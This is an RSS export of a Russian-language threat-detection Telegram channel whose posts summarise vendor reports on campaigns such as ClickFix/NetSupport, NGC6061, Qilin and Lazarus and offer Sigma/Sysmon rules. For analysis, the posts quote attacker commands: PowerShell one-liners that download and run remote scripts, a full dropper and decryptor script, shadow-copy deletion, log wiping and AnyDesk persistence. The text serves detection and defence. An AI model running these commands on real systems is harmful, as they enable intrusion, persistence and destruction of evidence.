+ParentImage|endswith: "\cmd.exe"
+selection_child:
+Image|endswith: "\tc_server.exe"
+CommandLine|contains:
+- '||'
+- '&amp;&amp;'
+- 'powershell'
+- 'pwsh'
+- 'wscript'
+- 'cscript'
+- 'sh'
+- 'bash'
+- 'reg'
+- 'regsvr32'
+- 'bitsadmin'
+- 'mshta'
+- 'rundll32'
+- 'curl'
+condition: all of selection*
+🔤 Журнал ошибок веб-сервера TrueConf также может содержать признаки эксплуатации (пример пути: C:\TrueConf\web_logs\error.*.log): error: the required argument for option '--Serial' is missing
+Важно: указанная выше строка является однозначным признаком попытки эксплуатации уязвимости (инъекция команды через аргумент /Serial), однако возможно появление эксплоитов, где до инъекции указывается корректный ключ активации.
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 29 Oct 2025 07:24:42 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_286</guid></item><item><title>Продолжим разбор шпионской кампании ForumTroll</title><link>https://t.me/detectioneasy/285</link><description>Всем привет! 💻✌️
+Продолжим разбор шпионской кампании ForumTroll
+Атакующие использовали шпионское ПО LeetAgent - его команды написаны Leet стилем:
+🔤 0xC033A4D - COMMAND
+🔤 0xECEC - EXEC
+🔤 0x6E17A585 - GETTASKS
+У ВПО есть функционал кейлоггера и стиллера для документов - *.doc, *.xls, *.ppt, *.rtf, *.pdf, *.docx, *.xlsx, *.pptx
+Для хостинга C2 использовалась инфраструктура, задействующая Fastly.net
+Исследователям удалось атрибутировать кампанию и откатить её активность как минимум до 2022 года. Векторы распространения — фишинг
+🔤 Балтийский_Вектор_2023.iso
+🔤 DRIVE.GOOGLE.COM (исполняемый файл)
+🔤 Приглашение_Россия-Беларусь_крепкое_партнёрство_2024.lnk
+Также удалось обнаружить схожую кампанию:
+🔤 SCAN_XXXX_&lt;DATE&gt;.pdf.lnk
+🔤 &lt;DATE&gt;_winscan_to_pdf.pdf.lnk
+🔤 Ростелеком.pdf.lnk
+По набору ТТП исследователи подтвердили связь между операциями. В рамках кампании был обнаружен коммерческий вредонос Dante
+Dante имеет большой набор проверок на запуск в песочнице,
+но из всех выделяется проверка строк в журналах событий Windows
+Вредонос проверяет строки связанные с виртуальными машинами и утилитами для реверса
+У каждой жертвы Dante есть infection-GUID на основе которого формируется имя директории для хранения остальных модулей и ключ реестра для настроек.
+Папка с модулями Dante расположена в %LocalAppData%. Ее имя представляет собой строку в Base64 длиной в восемь байт. В ней содержатся файлы без расширений с именами в виде строк в Base64 длиной в восемь байт. Имя одного из файлов совпадает с именем папки. Эту информацию можно использовать для того, чтобы идентифицировать активные заражения.
+В реестре встречается ключ: HKCU\Software\Classes\.zdmtnd\OpenWithProgids - zdmtnd - часть от Base64(GUID)
+🔭Обнаружение:
+🔤 хантим названия директорий (?:\w\d){8} и увеличиваем критичность, если внутри файл с таким же именем
+🔤 проверяем ключи реестра на наличие аномалий HKCU\Software\Classes\.zdmtnd\OpenWithProgids, где имя расширения/ключа выглядит как Base64-строка
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото]</description><pubDate>Tue, 28 Oct 2025 04:15:55 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_285</guid></item><item><title>Коллеги из ЛК обнаружили шпионскую кампанию, которая использовала 0-day уязвимость в браузере Chrome - позволяет выполнить код за пределами песочницы</title><link>https://t.me/detectioneasy/284</link><description>Всем привет! 💻✌️
+Коллеги из ЛК обнаружили шпионскую кампанию, которая использовала 0-day уязвимость в браузере Chrome - позволяет выполнить код за пределами песочницы
+🔤Атака начинается с фишингового письма, которое побуждает пользователя перейти по ссылке
+🔤После перехода веб-сайт валидировал пользователя и запускал эксплойт
+🔤Если пользователь подтверждался валидатор обменивается ключами с C2-сервером и расшифровывает следующий этап, который скрыт в запросах к файлам шрифтов bootstrap.bundle.min.js и .woff2
+🔤Эксплойт позволяет получить дексриптор потока браузера, и выполнить вредоносный код в процессе браузера
+🔤Следующий этап для закрепления использовал технику COM hijacking - HKCU\Software\Classes\CLSID\{AA509086-5Ca9-4C25-8F95-589D3C07B48A}\InProcServer32 - %AppData%\...\twinapi.dll
+🔭 Обнаружение:
+🔤 у sigma есть правило для обнаружения загрузки DLL не из системных путей
+🔤 отслеживать изменение значений в ключах реестра HKCU\Software\Classes\CLSID\*\InProcServer32
+p.s. разработчики firefox выявили схожую закономерность в своем IPC-коде и выпустили обновление под CVE-2025-2857
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Mon, 27 Oct 2025 07:17:04 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_284</guid></item><item><title>Очередная атака начинается с фишинга ClickFix для доставки RMM NetSupport</title><link>https://t.me/detectioneasy/283</link><description>Всем привет! 💻✌️
+Очередная атака начинается с фишинга ClickFix для доставки RMM NetSupport
+Пользователям предлагается выполнить одну из команд:
+"PowerShell.exe" -w h -nop -ep Bypass -c "$S='hxxps://riverlino[.]com/U.GRE';$j=$env:TEMP+'\1.ps1';(New-Object Net.WebClient).DownloadFile($S,$j);powershell -f $j"
+"PowerShell.exe" -w h -nop -c "&amp;('iex') (New-Object IO.StreamReader([Net.WebRequest]::Create('https://xunira[.]cloud/C[.]GRE').GetResponse().GetResponseStream())).ReadToEnd()"
+В отчете отлично расписан функционал загружаемого PS1:
+🔤Декодированние base64 и преобразование его в JSON.
+JSON устроен интересно ключ - это список в котором каждая запись содержит два ключа имя файла и содержимое файла в base64, например:
+{"MLh0b": [{"Heg": "client32.exe", "VnZv":"TVqQAAMAA"}]}
+🔤Создает скрытый системный каталог для дропера в C:\Users\Public\{\w\d+}
+🔤Декодириует ключи JSON и записывает в скрытую папку
+🔤Закрепляется с помощью ярлыка в папке %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+🔤Проверяет, что все файлы, связанные с NetSupport, успешно записаны на диск
+🔤Запускает клиент NetSupport, в данном случае он называется client32.exe
+В другой кампании у PS1 появился функционал антифорензики - удаление ключей RunMRU
+Remove-ItemProperty -Path- 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue
+🔭 Обнаружение:
+🔤 Обнаружение командлетов Powershell Get-Random, FromBase64String, System.Text.Encoding, Attributes, Wscript.Shell, CreateShortcut
+🔤 Создание файлов и директорий в C:\Users\Public\ , в исключение можно добавить explorer.exe
+🔤 создание скриптами файлов в %APPDATA%\Microsoft\Windows\Start
+🔤 удаление ключей реестра из HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+P.S. не замечал в других отчетах рекомендации по отключению диалогого окна Выполнить
+User Configuration &gt; Administrative Templates &gt; Start Menu and Taskbar &gt; Enable “Remove Run menu from Start Menu”
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Sat, 25 Oct 2025 16:03:24 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_283</guid></item><item><title>Lazarus использует интересный способ создания вредоносных DLL, который описан в отчете  ESET - злоумышленники внедряют код в open-source проекты и используют их как proxy-dll</title><link>https://t.me/detectioneasy/282</link><description>Всем привет! 💻✌️
+Lazarus использует интересный способ создания вредоносных DLL, который описан в отчете  ESET - злоумышленники внедряют код в open-source проекты и используют их как proxy-dll
+Вероятно, open-source проекты используются в качестве легитимной обёртки для обхода средств хостовой защиты 🤔
+🔭 Обнаружение:
+🔤 отслеживаем загрузку DLL не из стандартных директорий
+ProviderName="Microsoft-Windows-Sysmon" and EventId=7
+and Image endswith "wksprt.exe"
+and ImageLoaded endswith "\webservices.dll"
+and not ImageLoaded startswith "c:\windows\system32\"
+and not ImageLoaded startswith "c:\windows\syswow64\"
+ProviderName="Microsoft-Windows-Sysmon" and EventId=7
+and Image endswith "\wkspbroker.exe"
+and ImageLoaded endswith "\radcui.dll"
+and not ImageLoaded startswith "c:\windows\system32\"
+and not ImageLoaded startswith "c:\windows\syswow64\"
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Fri, 24 Oct 2025 09:03:05 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_282</guid></item><item><title>Давайте познакомимся с отчетом Google TI</title><link>https://t.me/detectioneasy/281</link><description>Всем привет! 💻✌️
+Давайте познакомимся с отчетом Google TI
+Атака начинается с фишинга — ClickFix (Fake Captcha)
+Атакующие предлагают жертве выполнить удалённую DLL
+rundll32.exe \\Ninspectguarantee.org\check\iamnotarobot.dll,humanCheck ;l'am not a robot
+DLL используется для загрузки следующего этапа
+Отличительные особенности:
+🔤 Установка Python для запуска скриптов
+🔤 Регистрация собственного расширения в реестре для хранения части ключа шифрования
+reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\.pietas" /v "ratio" /t REG_BINARY /d "f5e210ec114e1992b81ff89be58cfb2778005f734972239b9655b23fcee5593f19554d0a74dad52c67956781367b06e6" /f
+🔤 Закрепление через планировщик задач
+powershell -c "
+$s = New-Object -ComObject Schedule.Service;
+$s.Connect();
+$t = $s.NewTask(0);
+$p = $t.principal;
+$p.logontype = 3;
+$p.RunLevel = 0;
+$a = $t.Actions.Create(0);
+$a.Path = \"$env:APPDATA\Python38-64\pythonw.exe\";
+$a.Arguments = \"$env:APPDATA\Python38-64\Lib\libsystemhealthcheck.py\";
+$a.WorkingDirectory = \"$env:APPDATA\Python38-64\";
+$tr = $t.Triggers.Create(9);
+$tr.userID = \"$env:computername\"+\"\\\"+\"$env:username\";
+$tr.enabled = $true;
+$s.GetFolder(\"\").RegisterTaskDefinition(\"System health check\", $t, 6, $null, $null, 0) | Out-Null;"
+🔤 Использование bitsadmin для загрузки .py-скриптов через BITS
+🔭 Обнаружение:
+🔤 Описание аномалий подсистемы BITS в моей статье на хакере и в PR
+🔤 Запуск DLL с удалённых ресурсов
+ProviderName="Microsoft-Windows-Sysmon" and EventId=1 and Image endswith "rundll32.exe" and CommandLine match "^\s*\\\\" and CommandLine match "\.dll,"
+ProviderName="Microsoft-Windows-Sysmon" and EventId=22 and Image endswith "rundll32.exe" and QueryName not match "^(?:[A-Za-z0-9-]+\.)*(?:company\.com|company\.loc|corp\.local)$"
+🔤 Добавление новых расширений в ключ реестра HKEY_CURRENT_USER\SOFTWARE\Classes\
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Thu, 23 Oct 2025 17:57:30 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_281</guid></item><item><title>В 2023 зашифровали компанию Capita Group, а сейчас поделились отчетом о возможных причинах, которые привели к этому</title><link>https://t.me/detectioneasy/280</link><description>Всем привет! 💻✌️
+В 2023 зашифровали компанию Capita Group, а сейчас поделились отчетом о возможных причинах, которые привели к этому
+Может кто-то узнает тут себя...
+🔤 Алерты обрабатывались неправильно или им не уделялось должного внимания
+Первый вредоносный файл (jdmb.js) вызвал оповещение уровня P2 (высокий уровень) в 08:00 22 марта 2023 года, что указывало на получение доступа
+🔤 Чрезмерная задержка между обнаружением инцидента и его локализацией, а также отсутствие автоматизации
+Для изоляции устройства от остальной сети Capita по-прежнему требовалось вмешательство человека, на которое ушло 58 часов.
+У SOC Capita не было возможности изолировать устройство автоматически. К тому времени злоумышленник уже получил доступ к администратору домена и начал горизонтальное перемещение
+🔤 Неэффективные процессы реагирования на инциденты
+Компания Capita начала процесс реагирования на инцидент только в 09:22 29 марта 2023 года, то есть через семь дней после взлома.
+К тому моменту уже началась утечка данных, а до развертывания шифровальщика оставалось два дня.
+🔤 Нехватка персонала и чрезмерная нагрузка на команду SOC
+Известно, что на момент инцидента в марте 2023 года в Capita работал один аналитик SOC в смену. Это, в сочетании с низкой эффективностью в прошлом, указывает на системные проблемы в SOC, в том числе на нехватку персонала, недостаточную подготовку и/или неэффективные процессы.
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Sun, 19 Oct 2025 14:54:47 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_280</guid></item><item><title>Продолжаем серию журналов теперь за Q3</title><link>https://t.me/detectioneasy/278</link><description>Всем привет! 💻✌️
+Продолжаем серию журналов теперь за Q3
+
+[Media: Видео, Документ]</description><pubDate>Sat, 18 Oct 2025 11:07:42 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_278</guid></item><item><title>Давайте познакомимся с TTP Mysterious Elephant, замеченную в атаках против госструктур Южной Азии</title><link>https://t.me/detectioneasy/277</link><description>Всем привет! 💻✌️
+Давайте познакомимся с TTP Mysterious Elephant, замеченную в атаках против госструктур Южной Азии
+Исследователи Kaspersky GReAT описали инструменты группы, включающие собственные загрузчики и модули эксфильтрации
+🔤 Атаки начинаются с фишинга (ранее использовалась уязвимость CVE-2017-11882)
+🔤 Powershell-скрипт для скачивания полезной нагрузки через curl/certutil и создание задач в Task Scheduler
+🔤BabShell — C++ реверс-шелл, выполняет команды в отдельных потоках, сохраняет логи в output_*.txt, с antisandbox
+🔤 MemLoader (HidenDesk / Edge) — PE-загрузчик с antisandbox
+🔤 Модули эксфильтрации
+Uplo — поиск документов и отправка (txt, .doc, .docx, .pdf, .xls, .xlsx, .csv, .ppt, .pptx, .zip, .rar, .7z, .pfx, .vcf, .jpg, .jpeg и .axx)
+Stom — поиск документов (pdf, .docx, .txt, .jpg, .png, .zip, .rar, .pptx, .doc, .xls, .xlsx, .pst и .ost.) и сбор и сбор данных из WhatsApp Desktop 🛑 %AppData%\\Packages\\xxxxx.WhatsAppDesktop_[WhatsApp ID]\\LocalState\\Shared\\transfers\\
+ChromeStealer — кража cookie и сессий Chrome
+🔭 Обнаружение:
+🔤 создание файлов с именами системных утилит, например c:\ProgramData\Intel\ping.exe
+🔤 загрузка файлов через curl.exe, в отчете используется curl.exe.exe что может обойти правила обнаружения с конструкцией endswith curl.exe или аналогичной, но должно отработать правило на двойное расширение
+🔤 создание задач через schtasks.exe, которая запускается по XPath-выражению, а не в определенное время
+🔤 использование Invoke-RestMethod, Invoke-WebRequest
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Fri, 17 Oct 2025 08:12:23 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_277</guid></item><item><title>У многих на слуху DFIR/TH инструмент Velociraptor 🦖. Он позволяет централизованно собирать артефакты, события из журналов и много чего еще, а также выполнять команды</title><link>https://t.me/detectioneasy/274</link><description>Всем привет! 💻✌️
+У многих на слуху DFIR/TH инструмент Velociraptor 🦖. Он позволяет централизованно собирать артефакты, события из журналов и много чего еще, а также выполнять команды
+Приложение является клиент-сервером, клиенты устанавливаются в роли службы с правами root или system
+Виндовый клиент еще подписан - rapid7
+Сложилось все, чтобы Velociraptor попал в категорию RMM (Remote monitoring and management) и стал использоваться хакерами в атаках
+Solar упоминали об этом еще в 2024 году
+Rapid7 дали рекомендации по обнаружению
+🔭 Обнаружение:
+🔤 по метаинформации файла
+Description: Velociraptor: Digging Deeper!
+Product: Velociraptor
+Company: Rapid 7 Inc
+OriginalFileName: Velociraptor.exe
+🔤 при первом запуске создается ключ в реестре HKLM\System\CurrentControlSet\Services\EventLog\Application\Velociraptor
+🔤 отслеживаем аргументы -ExecutionPolicy Unrestricted -encodedCommand команды выполняются в следующем виде, если артефакт powershell и команда dir
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand ZABpAHIA
+для cmd
+cmd.exe /c dir
+🔤 Rapid7 предложило Sigma-правило, в котором отслеживаются аргументы командой строки
+selection_velociraptor:
+Image|endswith: '\Velociraptor.exe'
+selection_suspicious_args:
+CommandLine|contains:
+- "--config"
+- "client.config.yaml"
+- "service run"
+selection_unsigned:
+Signature|endswith:
+- "Unsigned"
+condition: selection_velociraptor and (selection_suspicious_args or selection_unsigned)
+🔤 также во время работы создаются два файла с расширениями yaml и yaml.bak
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Thu, 16 Oct 2025 14:48:17 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_274</guid></item><item><title>Давайте рассмотрим интересную технику доставки из отчета ЛК</title><link>https://t.me/detectioneasy/273</link><description>Всем привет! 💻✌️
+Давайте рассмотрим интересную технику доставки из отчета ЛК
+Злоумышленники использовали Squirrel и NodeJS loader для запуска легетимного приложения уязвимого к загрузки dll
+Перед запуском приложения оно копируется в пользовательскую директорию Video
+Для запуска обновления Squirrel необходим файлы RELEASES и *.nupkg
+🔭 Обнаружение:
+🔤 можем отслеживать создание файла RELEASES и *.nupkg в одной директории
+🔤 отслеживаем создание *.exe и *.dll в пользовательских директориях, например Video
+🔤 отслеживаем создание и загрузку в память неподписанной библиотеки chrome_elf.dll
+В репозитории Sigma также есть правило
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Mon, 13 Oct 2025 15:39:12 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_273</guid></item><item><title>Message 272</title><link>https://t.me/detectioneasy/272</link><description/><pubDate>Thu, 02 Oct 2025 15:57:00 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_272</guid></item><item><title>В разборе TTP Qilin авторы описывают этап подготовки перед шифрованием</title><link>https://t.me/detectioneasy/271</link><description>Всем привет! 💻✌️
+В разборе TTP Qilin авторы описывают этап подготовки перед шифрованием
+🔤остановка службы и удаление теневых копий
+wmic service where name=’vss’ call ChangeStartMode Manual
+net start vss
+vssadmin.exe delete shadows /all /quiet
+net stop vss
+wmic service where name=’vss’ call ChangeStartMode Disabled
+🔤очистка логов во всех журналах
+“powershell” $logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ( $l in $logs | Sort | Get-Unique ) {[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)}
+🔤закреп в реестре
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+🔭 Обнаружение:
+🔤 отслеживаем использование wmic, vssadmin
+🔤 отслеживаем использование ps - ClearLog, Get-WinEvent
+🔤 создание новых ключей в ветке реестра *\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Thu, 02 Oct 2025 15:53:19 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_271</guid></item><item><title>Давайте познакомимся с отчетом коллег из Angara MTDR</title><link>https://t.me/detectioneasy/270</link><description>Всем привет! 💻✌️
+Давайте познакомимся с отчетом коллег из Angara MTDR
+Фишинговое письмо содрежит *.scr файл который мимикрирует под PDF, после его открытия извлекаются несколько файлов cmd и bat. Одна из команд создает закреп через AnyDesk
+echo QWERTY1234566 | AnyDesk.exe --set-password _unattended_access
+🔭 Обнаружение:
+🔤 отслеживать в командной строке совпадение с ".exe --set-password". Пример правила есть в Sigma, как по мне нужно добавить \.exe|\.scr|\.com
+🔤 отслеживать по запуску и подписи бинаря, наличию в командной строке --set-password
+Description: AnyDesk
+Product: AnyDesk
+Company: AnyDesk Software GmbH
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Wed, 01 Oct 2025 16:07:39 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_270</guid></item><item><title>Продолжим рассматривать уязвимости, связанные с загрузкой dll</title><link>https://t.me/detectioneasy/268</link><description>Всем привет! 💻✌️
+Продолжим рассматривать уязвимости, связанные с загрузкой dll
+Notepad++ уязвим к DLL hijacking, на GitHub представили poc CVE-2025-56383
+🔭Обнаружение:
+🔤 Можем отслеживать создание DLL - NppConverter.dll, без EXE - notepad++.exe
+🔤 Можем отслеживать загрузку в память библиотеки без подписи
+ProviderName="Microsoft-Windows-Sysmon" and EventId=7
+and Image endswith "notepad++.exe"
+and ImageLoaded endswith "NppExport.dll"
+and SignatureStatus != "Valid"
+and Signature != "Notepad++"
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Tue, 30 Sep 2025 13:15:45 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_268</guid></item><item><title>Давайте продолжим обзор отчета Solar о фишинговых кампаниях, применяемых группировкой NGC6061</title><link>https://t.me/detectioneasy/267</link><description>Всем привет! 💻✌️
+Давайте продолжим обзор отчета Solar о фишинговых кампаниях, применяемых группировкой NGC6061
+В 2025 году, группировка продолжает использовать self-extracted LNK, но последним этапом стал дроп файлов KeyScrambler.exe и KeyScramblerIE.dll, (exe-легитимный бинарь, а dll-metasploit дропер)
+KeyScrambler.exe - антикейлоггер, уязвим к DLL sideloading
+🔭 Обнаружение:
+🔤 Отслеживание файлов с именем KeyScramblerIE.dll. Можем похантить в $mft
+ProviderName="Microsoft-Windows-Sysmon" and EventId=11 and TargetFilename contains "KeyScramblerIE.dll"
+🔤 Загрузка библиотеки с именем KeyScramblerIE.dll
+ProviderName="Microsoft-Windows-Sysmon" and EventId=7
+and Image endswith "KeyScrambler.exe"
+and ImageLoaded endswith "KeyScramblerIE.dll"
+and SignatureStatus != "Valid"
+and Signature != "QFX Software Corporation"
+UPD:
+🔤 можем похантить в amcache и prefetch - KeyScrambler.exe
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Sun, 28 Sep 2025 14:12:10 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_267</guid></item><item><title>Solar выпустил отчет о фишинговых кампаниях, применяемых группировкой NGC6061</title><link>https://t.me/detectioneasy/263</link><description>Всем привет! 💻✌️
+Solar выпустил отчет о фишинговых кампаниях, применяемых группировкой NGC6061
+Атака начинается с фишингового письма, которое содержит ZIP -&gt; self-extracted LNK
+При запуске ярлыка выполняется следующий ps-скрипт. Скрипт извелекает из LNK два файла - ps1, decoy-docx, сохраняет их в c:\windows\Temp и запускает
+powershell.exe -exec bypass -w 1 -c $p=Get-ChildItem -Path $env:userprofile -Include Interview_questions.doc.lnk -Recurse;
+$tbytes=[System.IO.File]::ReadAllBytes($p); $tstr=$tbytes|ForEach-Object{$_.ToString('X2')};
+for($i=0;$i-le$tstr.Length;$i++){
+if($tstr[$i]-eq'24'-and$tstr[$i+1]-eq'42'){
+$st=$i;break;
+}
+}
+for($i=0;$i-le$tstr.Length;$i++){
+if($tstr[$i]-eq'50'-and$tstr[$i+1]-eq'4B'-and$tstr[$i+2]-eq'03'){
+$ed=$i;
+break;
+}
+}
+for($j=$st;$j-lt$ed;$j++){
+$ec+=$tstr[$j]
+}
+for($l=$ed;$l-le$tstr.Length;$l++){
+$oc+=$tstr[$l];
+}
+$by=[byte[]]($ec -split '([0-9a-f]{2})'|Where-Object{$_ -match '[0-9a-f]{2}'}|ForEach-Object{[Convert]::ToByte($_, 16)});
+$cy=[byte[]]($oc -split '([0-9a-f]{2})'|Where-Object{$_ -match '[0-9a-f]{2}'}|ForEach-Object{[Convert]::ToByte($_, 16)}); $ye=[system.Text.Encoding]::default.getstring($by); [System.IO.File]::WriteAllBytes('c:\windows\temp\u1.ps1', $by); [System.IO.File]::WriteAllBytes('c:\windows\temp\1.docx', $cy);
+start-process c:\windows\temp\1.docx;
+powershell.exe -exec bypass -w 1 -f c:\windows\temp\u1.ps1;
+Второй скрипт расшифровывает полезную нагрузку, проверяет количество логических процессоров и если их меньше двух 2, то запускает decoy, иначе запускает бинарь
+$B64="&lt;base64_encode_str&gt;"
+$TDESKEY = 'fRTYUIOEGo6nMYPcyCnEJc4qVRTkGY82'
+function decode($EncryptedData) {
+$Data = $EncryptedData.Split(':')
+$TD = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
+$Key = [Convert]::FromBase64String($TDESKEY)
+$IV = [Convert]::FromBase64String($Data[0])
+$DataByte = [Convert]::FromBase64String($Data[1])
+$MS = New-Object System.IO.MemoryStream(,$DataByte)
+$CS = New-Object System.Security.Cryptography.CryptoStream($MS,$TD.CreateDecryptor($Key,$IV), [System.Security.Cryptography.CryptoStreamMode]::Read)
+$Reader = New-Object System.IO.StreamReader($CS)
+$Result = $Reader.ReadToEnd()
+$Reader.Dispose()
+$Bytes=[System.Convert]::FromBase64String($Result)
+[System.IO.File]::WriteAllBytes( "c:\windows\temp\cgi2.exe",$Bytes)
+return $Bytes
+}
+$t3=Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty NumberOfLogicalProcessors;
+if($t3 -le 2)
+{
+calc.exe;
+}
+else
+{
+[byte[]]$readb=decode($B64);
+start-sleep(100);
+c:\windows\temp\cgi2.exe
+}
+Интересно, что пути захардкожены c:\windows\temp\
+🔭  Для обнаружения достаточно индикаторов:
+🔤 Создание LNK с ADS NTFS в %Temp% или в одной из директорий пользователя
+🔤 Анализ опасных-командлетов powershell System.Security.Cryptography, WriteAllBytes, System.IO.File, ReadAllBytes, byte[], ToByte
+#detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Sat, 27 Sep 2025 08:03:54 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_263</guid></item><item><title>Message 262</title><link>https://t.me/detectioneasy/262</link><description/><pubDate>Thu, 25 Sep 2025 14:02:56 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_262</guid></item><item><title>Коллеги из Zero Salarium описали кейс, когда при создании новой задачи или службы указывается несуществующий исполняемый файл, например, C:\TMP\test</title><link>https://t.me/detectioneasy/261</link><description>Всем привет! 💻✌️
+Коллеги из Zero Salarium описали кейс, когда при создании новой задачи или службы указывается несуществующий исполняемый файл, например, C:\TMP\test
+При создании процесса CreateProcess пытается найти указанный файл, если test не существует, система автоматически ищет в той же директории файл test.exe
+Таким образом, если в папке C:\TMP\ лежит файл test.exe, он будет успешно запущен
+Такой же трюк можно сделать с двойным расширением:
+В задаче указываем c:\temp\test.exe, а в директории будет файл c:\temp\test.exe.exe
+В целом ничего страшного не происходит, нужно проверить (доработать), что автореспонс (и скрипты) найдут файл, указанный в задаче
+🔭 Обнаружение (Threat Hunting):
+🔤 мониторим процессы и файлы с двойным расширением
+🔤 можем смапить путь к файлу в реестре (задаче или службы) и его наличие на диске
+#detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Thu, 25 Sep 2025 13:59:54 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_261</guid></item><item><title>Коллеги из ЛК отметили, что группировка RevengeHotels (TA558) использует LLM для разработки дроперов на JS. Отличительная особенность - большое количество комментариев и отсутствие обфускации</title><link>https://t.me/detectioneasy/260</link><description>Всем привет! 💻✌️
+Коллеги из ЛК отметили, что группировка RevengeHotels (TA558) использует LLM для разработки дроперов на JS. Отличительная особенность - большое количество комментариев и отсутствие обфускации
+🔭 Обнаружение:
+🔤 Ищем JS-файлы по паттерну *.js в директориях пользователя
+ProviderName="Microsoft-Windows-Sysmon" and EventId=11 and TargetFilename endswith ".js" and TargetFilename contains ":\Users\"
+🔤 Для закрепа VenomRAT использует ключ реестра HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ProviderName="Microsoft-Windows-Sysmon" and EventId=13 and EventType="SetValue" and TargetObject startswith "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+обнаружим Run, RunOnce, RunOnceEx
+🔤 Малварь копирует себя на съемные диски под именем My Pictures.exe. Отслеживаем создание EXE-файлов на съемных устройствах
+ProviderName="Microsoft-Windows-Sysmon" and EventId=11 and TargetFilename endswith ".exe" and TargetFilename matches "[C-M]:\\\\.*" and not Image endswith "explorer.exe"
+#detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Mon, 22 Sep 2025 14:59:06 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_260</guid></item><item><title>Команда any.run выпустила интересный материал о применении SVG-файлов в фишинге.</title><link>https://t.me/detectioneasy/258</link><description>Всем привет! 💻✌️
+Команда any.run выпустила интересный материал о применении SVG-файлов в фишинге.
+Что важно помнить?
+Файл формата SVG (векторная графика), часто используется злоумышленниками для обхода стандартных механизмов защиты. Такие файлы могут содержать код скриптов
+🔭 Обнаружение:
+🔤 можем отслеживать создание SVG-файлов в каталогах пользователей:
+ProviderName="Microsoft-Windows-Sysmon" and EventId=11 and TargetFilename contains "\\Users\\" and TargetFilename endswith ".svg"
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Wed, 17 Sep 2025 07:14:24 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_258</guid></item><item><title>Коллеги из bi.zone уведомили о новых техниках Fluffy Wolf</title><link>https://t.me/detectioneasy/256</link><description>Всем привет! 💻✌️
+Коллеги из bi.zone уведомили о новых техниках Fluffy Wolf
+Давайте вспомним как это было в прошлогоднем отчете. Хакеры использовали схему фишинга RAR (с паролем) -&gt; COM. Примечательно, что пароль был указан в имени архива, возможно использовалось для обхода антифишинга
+🔭 Обнаружение:
+🔤 в двух кампаниях злоумышленники используют раширение com, вместо exe, можем этим воспользоваться для хантинга
+🔤 можем похантить имена файлов с "парол|pass"
+🔤 создать правило обнаружения таких файлов
+ProviderName="Microsoft-Windows-Sysmon" and EventId = 11 and TargetFilename contains "\Users\" and (Image contains "парол" or Image contains "pass")
+ProviderName="Microsoft-Windows-Sysmon" and EventId = 11 and TargetFilename contains "\Users\" and (Image endswith ".com")
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Tue, 09 Sep 2025 19:32:34 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_256</guid></item><item><title>Давайте рассмотрим несколько способов закрепления в системе, которые использовали Lazarus 😤</title><link>https://t.me/detectioneasy/254</link><description>Всем привет! 💻✌️
+Давайте рассмотрим несколько способов закрепления в системе, которые использовали Lazarus 😤
+Они использовали уязвимость - Phantom DLL Loading, в службе SessionEnv
